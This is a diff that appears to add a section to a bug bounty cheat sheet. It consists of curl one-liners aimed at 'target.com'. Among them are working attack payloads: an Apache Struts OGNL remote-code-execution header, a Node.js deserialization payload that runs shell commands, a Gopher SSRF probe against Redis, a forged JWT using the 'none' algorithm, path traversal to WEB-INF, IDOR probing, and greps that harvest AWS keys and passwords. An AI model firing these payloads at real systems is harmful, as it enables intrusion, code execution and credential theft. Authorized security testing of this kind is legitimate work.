@@ -3091,3 +3091,117 @@ curl -s https://target.com | grep -E 'AWS_ACCESS_KEY|DB_PASSWORD'
 curl -I https://target.com | grep -i "X-Frame-Options\|Content-Security-Policy\|Strict-Transport-Security"
 ```
 
+Here's the converted content:
+
+**Test for Gopher SSRF**  
+```bash
+curl "https://target.com/?url=gopher://127.0.0.1:6379/_INFO"
+```
+
+**Open Admin Panels Discovery**  
+```bash
+gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,aspx
+```
+
+**Exposed Docker API**  
+```bash
+curl -s http://target.com:2375/containers/json
+```
+
+**Check for Log Injection**  
+```bash
+curl "https://target.com/login?username=%0a%0dINJECTEDLOG&password=test"
+```
+
+**Test for Prototype Pollution**  
+```bash
+curl "https://target.com/api?__proto__[polluted]=true"
+```
+
+**Exposed Backup Files via Common Extensions**  
+```bash
+curl -I https://target.com/index.php~
+```
+
+**Check for Arbitrary File Read (Java Web Apps)**  
+```bash
+curl -s https://target.com/admin/..;/WEB-INF/web.xml
+```
+
+**Check for Error-Based SQL Injection**  
+```bash
+curl "https://target.com/product?id=1'"
+```
+
+**Check for Misconfigured Exposed GitLab/GitHub Pages**  
+```bash
+curl -I https://target.com/.gitlab-ci.yml
+```
+
+**Find Public S3 Buckets in JavaScript Files**  
+```bash
+curl -s https://target.com/app.js | grep "s3.amazonaws.com"
+```
+
+**Test for Apache Struts RCE (Legacy)**  
+```bash
+curl -X POST -H "Content-Type: %{(#_=‘multipart/form-data’).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[‘com.opensymphony.xwork2.ActionContext.container’]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=‘id’).(#iswin=(@java.lang.System@getProperty(‘os.name’).toLowerCase().contains(‘win’))).(#cmds=(#iswin?{‘cmd.exe’,‘/c’,#cmd}:{‘/bin/sh’,‘-c’,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}" https://target.com/upload.action
+```
+
+**Detect Java Deserialization (CommonsCollections)**  
+```bash
+curl -X POST -H "Content-Type: application/x-java-serialized-object" --data-binary @exploit.ser https://target.com/upload
+```
+
+**Exposed Jenkins Console**  
+```bash
+curl -s https://target.com/script
+```
+
+**Insecure Cookie Handling Check**  
+```bash
+curl -I https://target.com | grep -i Set-Cookie
+```
+
+### 💻 Ultimate Bug Bounty One-Liners - Part 4
+
+**Find API Endpoints Directly from Web Responses**  
+```bash
+curl -s https://target.com | grep -oE 'https?://[^"]+/api/[^"]+' | sort -u
+```
+
+**Find Hardcoded Secrets in JS Files**  
+```bash
+curl -s https://target.com/app.js | grep -E "apikey|token|password|secret|client_id"
+```
+
+**Detect GraphQL Endpoints Automatically**  
+```bash
+curl -I https://target.com/graphql
+```
+
+**Test for Insecure Deserialization via JSON**  
+```bash
+curl -X POST https://target.com/api/v1/process -H "Content-Type: application/json" -d '{"user":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"id\")}()"}'
+```
+
+**Detect AWS Keys Leaked in Source**  
+```bash
+curl -s https://target.com/app.js | grep -E "AKIA[0-9A-Z]{16}"
+```
+
+**Check for Insecure Direct Object Reference (IDOR)**  
+```bash
+curl "https://target.com/api/v1/users/1234" -b "session=your_cookie_here"
+```
+*Change 1234 to 1233 or 1235 and see if you access other user data.*
+
+**Test for JWT None Algorithm Vulnerability**  
+```bash
+echo '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-' | tr -d '\n' | xargs -I % curl -H "Authorization: Bearer %.eyJ1c2VyIjoiYWRtaW4ifQ." https://target.com/api/private
+```
+
+**Find Sensitive Pages via Archive.org**  
+```bash
+curl -s "http://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=text&fl=original&collapse=urlkey" | grep -E "backup|admin|.sql|.env|.git"
+```
